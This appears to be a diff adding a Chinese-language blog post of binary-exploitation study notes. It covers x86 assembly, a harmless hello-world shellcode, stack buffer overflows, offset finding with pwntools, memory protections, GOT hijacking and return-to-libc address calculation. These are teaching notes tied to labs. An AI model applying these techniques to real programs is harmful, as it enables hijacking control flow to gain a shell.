+<li><p>jump&#x2F;call&#x2F;ret</p>
+<ul>
+<li>jmp 跳到某處執行</li>
+<li>call 先將下一行指令的地址存起來再跳到某處執行</li>
+<li>ret 把stack頂端pop到eip</li>
+</ul>
+</li>
+<li><p>leave</p>
+<ul>
+<li>還原stack</li>
+<li>moc esp,ebp;pop ebp<br><a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/questions/38030356/what-is-the-difference-between-leave-and-ret" >leave和ret的差別 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+</li>
+<li><p>nop</p>
+<ul>
+<li>什麼事都不做</li>
+<li>一個byte</li>
+<li>opcode &#x3D; 0x90</li>
+<li>寫shellcode可以當padding</li>
+</ul>
+</li>
+<li><p>System call</p>
+<ul>
+<li>instruction：int 0x80(x86);system call(x64)</li>
+<li>執行到int 0x80會進到System call</li>
+<li>eax放System call number，執行完會把return value放到eax</li>
+<li>參數(依序)：ebx,ecx,edx,esi,edi</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86" >src <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+</li>
+<li><p>Calling convention</p>
+<ul>
+<li>function call(call)</li>
+<li>function return(ret)</li>
+<li>functin argument(x86一般用stack，但也有用register)</li>
+<li>function prologue(compiler在function開頭加的指令，用來保存ebp分配區域變數所需空間)<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x30</span><br></pre></td></tr></table></figure></div></li>
+<li>function epilogue(回復成call function前的stack狀態)<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+</li>
+</ul>
+<h3 id="calling-convention"><a href="#calling-convention" class="headerlink" title="calling convention"></a>calling convention</h3><p>這邊我有自己做一份<a class="link"   target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/19FqFuOoPgU-WoMNGlQu5LMfXY/edit?usp=sharing" >ppt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>介紹calling convention的過程。<br>這邊建議多看幾次確定要很熟，後面很多攻擊都會需要很清楚知道程式怎麼call funtion的。</p>
+<h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p>開始寫第一個Assembly code</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    jmp msg</span><br><span class="line">write:</span><br><span class="line">    pop ecx</span><br><span class="line">    mov eax,4</span><br><span class="line">    mov ebx,1</span><br><span class="line">    mov edx,12</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov eax,1</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">msg:</span><br><span class="line">    call write</span><br><span class="line">    db &#x27;Hello world&#x27;,0xa</span><br></pre></td></tr></table></figure></div>
+<p>用Vim把這些寫進叫做hello.s的檔案裡，再用下面這兩行指令編成執行檔</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -felf32 hello.s -o hello.o</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ld hello.o -melf_i386 -o hello</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/cIfqbus.png"
+                     
+                ><br>這時候應該會有這三個檔案<br>跑hello</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/ecOOh2K.png"
+                     
+                ><br>逐行解釋這段code</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br></pre></td></tr></table></figure></div>
+<p>這是指寫在.text這個Segmant的意思，<a href="#Section">這邊</a><br>第二行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br></pre></td></tr></table></figure></div>
+<p>有點類似C語言中的int main()，不過這邊可以放任意的function，不一定是_start。<br><a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/questions/17882936/global-main-in-assembly" >ref <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>接下來就是_start,write,msg這三個funtion<br>_start裡面只有一行程式碼</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp msg</span><br></pre></td></tr></table></figure></div>
+<p>就是直接跳到msg這個funtion，這邊有用到jmp這個指令，補充一下這個instruction是無條件跳過去，還有很多跳的instruction，之後應該會有介紹，<a href="">這邊</a><br>目前已經跳到msg這個funtion了<br>這裡有兩行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call write</span><br><span class="line">db &#x27;Hello world&#x27;,0xa</span><br></pre></td></tr></table></figure></div>
+<p>分別是呼叫write和<br>定義Hello world這個字串到0xa，db就是define bytes的縮寫</p>
+<ul>
+<li>DB - Define Byte. 8 bits</li>
+<li>DW - Define Word. Generally 2 bytes on a typical x86 32-bit system</li>
+<li>DD - Define double word. Generally 4 bytes on a typical x86 32-bit system<br>接下來是write的部分<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ecx</span><br></pre></td></tr></table></figure></div>
+還記得前一個msg有用到call這個instruction，這會把他的下一行(“db ‘Hello world’,0xa”)的位址push到stack裡面(頂端)，然後再pop ecx，把stack頂端(“db ‘Hello world’,0xa”的位址)存到ecx，方便到時候funtion epilogue的時候能復原成call之前的stack狀態。</li>
+</ul>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,4</span><br></pre></td></tr></table></figure></div>
+<p>可以在Syscall的Document<a class="link"   target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=x86" >這裡 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，找到write的eax要放什麼?這邊的意思是系統會看你的eax去決定要做哪個system call，中文好像是呼叫慣例(?<br>這邊放4，系統就知道你要做write這個funtion。</p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,1</span><br></pre></td></tr></table></figure></div>
+<p>ebx要放的的是叫做fd(file descriptor)的東西，這邊放1表示std_out，想看更詳細的<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6" >這邊 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://blog.jaycetyle.com/2018/12/linux-fd-open-close/" >還有這邊 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>總之就是讓字串可以輸出在螢幕上~<br>stdin：標準輸入裝置(standard in)，預設是鍵盤。<br>stdout：標準輸出裝置(standard out)，預設是螢幕。<br>stderr：標準錯誤記錄裝置(standard error)，預設是螢幕。</p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx,12</span><br></pre></td></tr></table></figure></div>
+<p>這是指’Hello world’這個字串的長度為12，你自己去數會發現包括空白字元只有11個字元，為什麼是12呢?因為字串最後面還有一個空字元告訴程式這個字串到這而已，想看更多看<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%A9%BA%E5%AD%97%E7%AC%A6" >這邊 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 0x80</span><br></pre></td></tr></table></figure></div>
+<p>這是System call的用法，在使用 int 0x80 之前，必須要將我們剛查出來的號碼填到 eax 內；填好後，只要一使用 int 0x80，相對應的 system call 就會被呼叫。<a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1817577/what-does-int-0x80-mean-in-assembly-code" >這邊 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>接下來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,1</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></div>
+<p>這邊就是把原本eax的4改成1，也就是原本call write後來call exit結束掉程式，最後再用一次int 0x80去完成exit的動作。</p>
+<p>完結灑花&gt;&lt;</p>
+<p>以上就是第一個Assembly code</p>
+<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>攻擊者為了拿到shell注入的程式碼叫做shellcode，由machine code組成。</p>
+<p>產生shellcode有很多方法，例如：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objcopy -O binary hello.bin shellcode.bin</span><br></pre></td></tr></table></figure></div>
+<p>或是pwntools</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sc = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    jmp hello</span></span><br><span class="line"><span class="string">write :</span></span><br><span class="line"><span class="string">    mov eax,4</span></span><br><span class="line"><span class="string">    mov ebx,1</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string">    mov edx,12</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov eax,1</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">hello :</span></span><br><span class="line"><span class="string">    call write</span></span><br><span class="line"><span class="string">    .ascii &quot;Hello world&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sc)</span><br></pre></td></tr></table></figure></div>
+<p>這樣就能印出hello world的shellcode了</p>
+<p>在本地跑的話就是這樣：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\xeb\x19\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00Y\xba\x0c\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe2\xff\xff\xffHello world\x00&quot;</span>;</span><br><span class="line"><span class="comment">//剛剛的shellcode複製起來貼到這裡</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span>(*fptr)() = shellcode;</span><br><span class="line">    fptr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>記得用<br><code>$ gcc -m32 -z execstack test.c -o test</code><br>去編譯，這邊test.c就看你上面那坨code存的檔名是什麼，後面的test就是你編譯出來的執行檔檔名，也是任意取。</p>
+<p>編譯完應該會多出一個test的elf檔，這時候讓他跑起來就會出現hello world了。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xxd test</span><br></pre></td></tr></table></figure></div>
+<p>就可以看到他的shellcode<br>或是加上-i參數可以看到c語言字串形式的shellcode</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xxd -i test</span><br></pre></td></tr></table></figure></div>
+
+<p><a href="#Lab2">Lab2</a></p>
+<h2 id="Stack-base-buffer-overflow"><a href="#Stack-base-buffer-overflow" class="headerlink" title="Stack base buffer overflow"></a>Stack base buffer overflow</h2><h3 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h3><p>程式設計師未對buffer長度做檢查，導致駭客可以控制程式流程或是改變數的值。<br>依照buffer位置可以分成：</p>
+<ul>
+<li>stack base(stack smashing)</li>
+<li>data base</li>
+<li>heap base</li>
+</ul>
+<p>這些函式可能導致buffer over：</p>
+<ul>
+<li>gets</li>
+<li>scanf</li>
+<li>strcpy</li>
+<li>sprintf</li>
+<li>memcpy</li>
+<li>strcat</li>
+<li>…<br>這些函式都沒對buffer長度做檢查，所以可能導致buffer overflow</li>
+</ul>
+<p>buffer overflow的memory長這樣<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/R2A8uls.png"
+                     
+                ><br>首先是正常的memory<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/Uiq53D9.png"
+                     
+                ><br>先開一個char buf[20]的空間<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/liI40DT.png"
+                     
+                ><br>但是你放入了100個a，可以發現ebp和ret addr都被蓋成aaaa了<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/WrI1YR4.png"
+                     
+                ><br>當你要return的時候，pop ebp就把eip的值改成0x61616161(aaaa)了<br>這時候就成功的控制了eip的值了<br>return address被改成0x61616161，但是記憶體裡面沒有這個位址，所以就segment fault了</p>
+<p>那如果不要亂輸入a，輸入攻擊者的攻擊代碼位址，是不是就能為所欲為了呢?<br>這邊要注意x86是little-endian，address要反過來輸入<br>例子：<br>假設要填入0x080484fd<br>就要輸入\xfd\x84\x04\x08<br>或是用pwntool的p32()可以直接把你的address轉成little-endian的形式。</p>
+<h3 id="Return-to-Text-Shellcode"><a href="#Return-to-Text-Shellcode" class="headerlink" title="Return to Text&#x2F;Shellcode"></a>Return to Text&#x2F;Shellcode</h3><h4 id="Locate-funtion-address"><a href="#Locate-funtion-address" class="headerlink" title="Locate funtion address"></a>Locate funtion address</h4><p>接下來就是要如何讓程式跳到我們想跳的地方(shellcode)<br>首先要先找到我們想跳的地方的函式的位址，可以用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ info function</span><br></pre></td></tr></table></figure></div>
+<p>去看這隻程式所有函式的位址(或是objdump)。<br>然後要去找你要塞多少byte才能到你的目標函式，也就是你要覆蓋的函式的前面都要填滿東西，這邊可以用pwntool內建的工具cyclic。<br>進到python環境先打：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cyclic(<span class="number">100</span>) <span class="comment"># 這個數字可以任意填，這行的意思就是生成每4Byte都不重複的字串，長度是100</span></span><br></pre></td></tr></table></figure></div>
+<p>然後就會出現一大坨字串，像這樣：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/511SuBb.png"
+                     
+                ><br>再把這坨餵到程式的輸入裡，然後用gdb看他的EIP是哪四個字元，我用Lab3示範<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/x5JShND.png"
+                     
+                ><br>其實不一定是EIP，看你要對程式哪邊操作去決定要填到哪裡，這邊看到EIP的值是aava<br>接下來用cyclic_find()這個函式去找offset(填充的長度)要多少?<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/PwF5qbW.png"
+                     
+                ><br>可以看到offset是82。</p>
+<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>netcat用法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ncat -ve ./[binary] -kl [port]</span><br></pre></td></tr></table></figure></div>
+<p>Ex：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ncat -ve ./ret2sc -kl 8888</span><br></pre></td></tr></table></figure></div>
+<p>這邊的意思就是把你的ret2sc的binary放到你的localhost的8888port上，所以你nc loalhost:8888會執行這支binary<br>打<code>$ nc -v localhost 8888</code>就可以連過去囉<br>開始練習 <a href="#Lab3">Lab3</a></p>
+<h3 id="Protection"><a href="#Protection" class="headerlink" title="Protection"></a>Protection</h3><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>記憶體位址隨機變化<br>每次執行程式stack、heap、library位址都不一樣<br>Linux核心的東西<br><code>cat /proc/sys/kernel/randomize_va_space</code><br>這個指令可以看到ASLR的隨機化強度<br>分別有0、1、2</p>
+<ul>
+<li>0是關閉</li>
+<li>1是library、stack、mmap() 以及 VDSO 將被隨機化</li>
+<li>2是1再加上heap的位址都被隨機化</li>
+</ul>
+<p>用<code>$ ldd /bin/ls</code>可以看到執行時載入的library位址都不一樣</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/YynbFDt.png"
+                     
+                ></p>
+<h4 id="DEP-NX"><a href="#DEP-NX" class="headerlink" title="DEP(NX)"></a>DEP(NX)</h4><p><strong>大原則:可寫不能執行；可執行不能寫</strong><br>可以用gdb裡面的vmmap看process的權限</p>
+<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>用gcc編譯的時候預設不會開啟，加上-fPIC -pie就可以開啟<br>沒開:data段、code段固定<br>有開:data段、code段跟著ASLR</p>
+<h4 id="StackGuard"><a href="#StackGuard" class="headerlink" title="StackGuard"></a>StackGuard</h4><p>隨機生成亂數，function call的時候塞入，function return的時候檢查值有沒有變動<br>該亂數稱為canary<br>預設是開啟的，能有效的防止stack overflow<br>canary會放在tls區段裡面的tcbhead_t結構中，在x86&#x2F;x64架構下恆有一個暫存器指向tls區段裡面的tcbhead_t結構，在x86是gs;在x64是fs，取canary的值會直接以fs&#x2F;gs取。</p>
+<h3 id="Lazy-binding"><a href="#Lazy-binding" class="headerlink" title="Lazy binding"></a>Lazy binding</h3><p>由於ASLR機制，每次function的位置都不一樣<br>Dynamic Linking的程式在執行過程中，有些library的函式到結束都不會用到，因此為了節省時間，Lazy binding的機制會在第一次call function的時候再去找function位置進行binding，而不是一次把所有函式都找出來，這樣的效率比較高。</p>
+<h4 id="Global-Offset-Table"><a href="#Global-Offset-Table" class="headerlink" title="Global Offset Table"></a>Global Offset Table</h4><p>library的位置載入後才決定，所以在無法在編譯的時候知道位置<br>GOT是一個函式指標陣列，存library中function的位置<br>由於Lazy Binding機制的關係，程式在呼叫function的時候不會填上函式位置，而是填上一段PLT位置的code<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/Gxiwma4.png"
+                     
+                ><br>GOT主要分成</p>
+<ul>
+<li>.got(保存全域變數引用位置)</li>
+<li>.got.plt(保存函式引用位置)<ul>
+<li>前三項有特殊功能<ol>
+<li><strong>address of .dynamic</strong><br> (dynamic section的位置)</li>
+<li><strong>link_map</strong><br> (將有引用到的library串成的link list)</li>
+<li><strong>dl_runtime_resolve</strong><br> (找函式位置的函式)<a class="link"   target="_blank" rel="noopener" href="https://www.twblogs.net/a/5e50f236bd9eee21167ec0d0" >源碼分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<p>後面是.so函式引用位置</p>
+<h4 id="實作過程"><a href="#實作過程" class="headerlink" title="實作過程"></a>實作過程</h4><p>假設現在在call 一個叫做foo()的函式<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/taVK0LS.png"
+                     
+                ></p>
+<p><strong>第一次call foo()</strong></p>
+<p>在.got.plt裡面會寫成<strong>foo@plt+6</strong><br>+6就是 <strong>jmp *(foo@GOT)</strong> 的長度<br>因為foo是第一次被call所以會直接執行<strong>push index</strong>，跳過 <strong>jmp *(foo@GOT)</strong> 這行<br>接下來就開始執行Lazy Binding，這邊index根據你的function不同會有不同的值，push index後就jump到PLT0的code段。</p>
+<p>PLT0在所有PLT的最上方，<strong>push *(GOT+4)</strong> 這邊+4是因為32位元一個pointer是4byte<br><strong>push *(GOT+4)</strong> 主要是把link_map push進去<br>再來 <strong>jmp *(GOT+8)</strong> 是<strong>jmp dl_runtime_resolve()</strong><br>到這邊總結一下就是call了**dl_runtime_resolve()**，並且把link_map和index放進去<br>-&gt;<strong>dl_runtime_resolve(link_map,index)</strong></p>
+<p>接下來進到<strong>dl_runtime_resolve</strong>後<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/j6BolFi.png"
+                     
+                ><br>最核心的function就是<strong>call_fix_up()</strong><br>這個function會把函式真正的位置找出來，並且填回.got.plt(GOT)<br>然後<strong>ret 0xc</strong>就是return回foo()</p>
+<p><strong>第二次call foo()</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/q8p4U0J.png"
+                     
+                ><br>這次不會跳過第一行<strong>jmp *(foo@GOT)<strong>，這次會直接跳到.got.plt(GOT)裡面，由於第一次已經把位置填好了，所以會直接跳過去，不會再執行下面的</strong>push index</strong>和<strong>jmp PLT0</strong></p>
+<h4 id="How-to-find-GOT"><a href="#How-to-find-GOT" class="headerlink" title="How to find GOT"></a>How to find GOT</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -R elf</span><br></pre></td></tr></table></figure></div>
+<p>or</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r elf</span><br></pre></td></tr></table></figure></div>
+<p>GOT Hijacking主要的思路就是由於Lazy Binding的機制GOT必須要可以寫入，剛剛實作時把foo()填進GOT的時候把foo()改成system()就可以達到控制程式流程的效果了。</p>
+<p>GOT的防禦機制RELRO<br>RELRO分成三種：</p>
+<ul>
+<li><font color="#f00">Disabled</font><ul>
+<li>.got&#x2F;.got.plt都可寫</li>
+</ul>
+</li>
+<li><font color="#ffff143">Partial(Default)</font><ul>
+<li>只有.got.plt可寫，.got唯讀(這個是預設的)</li>
+</ul>
+</li>
+<li><font color="#008000">Fulled</font><ul>
+<li>會在load time的時候把所有函式找完並填完，把.got&#x2F;.got.plt都變成唯讀，這個模式下無法GOT Hijacking</li>
+</ul>
+</li>
+</ul>
+<h3 id="Return-to-Library"><a href="#Return-to-Library" class="headerlink" title="Return to Library"></a>Return to Library</h3><p>一般程式很難有system這種可以直接得到shell的function、DEP&#x2F;NX的保護機制也會讓你無法用shellcode去執行，但大部分程式在Dynamic Linking的情況下都會載入libc，libc有很多好用的function，例如：system、execve…<br>由於ASLR的關係，每次libc的載入位置都不一樣，通常都需要leak出libc的base address，然後加上offset就能導到你要的funtion。</p>
+<p>可以leak出libc base位置的地方有：</p>
+<ul>
+<li>GOT</li>
+<li>Stack上的殘值(funtion return後不會把stack清除)</li>
+<li>Heap上的殘值(free完後在malloc，不會把heap內容清空)</li>
+</ul>
+<p>一般情況下ASLR都是整個library image一起移動，因此只要leak出libc其中一個位址後，就可以推得全部function的位址。<br>可以用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -T [library版本] | grep [function]</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/RggHxpQ.png"
+                     
+                ><br>library大概長這樣，由於ASLR的關係，記憶體的位址會隨機，但是整個library一起隨機，他們的相對位置不會變(即使隨機，還是不會把他們的排序打亂，距離library_base的address(offset)也是固定的)<br>也就是說只要知道你需要用到的function的offset還有library_base的位置，就可以把你需要用到的function位址求出來。</p>
+<h4 id="實作過程-1"><a href="#實作過程-1" class="headerlink" title="實作過程"></a>實作過程</h4><p>要先確認library的版本，可以用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ldd [elf]</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/Az9SJuw.png"
+                     
+                ></p>
+<p>像這樣，可以看到是libc.so.6<br>然後用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -T  /lib32/libc.so.6 | grep printf</span><br></pre></td></tr></table></figure></div>
+<p>就可以看到有很多printf<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/ovo9EWB.png"
+                     
+                ><br>可以找到我們要的printf的offset是00053de0</p>
+<p>然後還需要找到system的位置，一樣用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -T  /lib32/libc.so.6 | grep system</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/q6ZAdNO.png"
+                     
+                ><br>那接下來只需要把printf的位置扣掉printf的offset再加上system的offset就可以得到system的位置了<br>:::info<br>公式：<br>libc_base_addr + printf_offset &#x3D; printf_addr<br>libc_base_addr + system_offset &#x3D; system_addr<br>已知printf_addr、printf_offset、system_offset就可以先算出libc_base_addr，然後再加上system_offset得到system_addr<br>:::<br>成功拿到system位置後就可以複寫return位置，跳到system得到shell。<br>這邊要注意要多空一格，因為我們用的是ret不是call，一般call之後會push一個return address到stack中，function會空一格再取參數。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i.imgur.com/ktSFK3l.png"
+                     
+                ></p>
+<p>總之就是會有一個return address在stack上，要記得空著。</p>
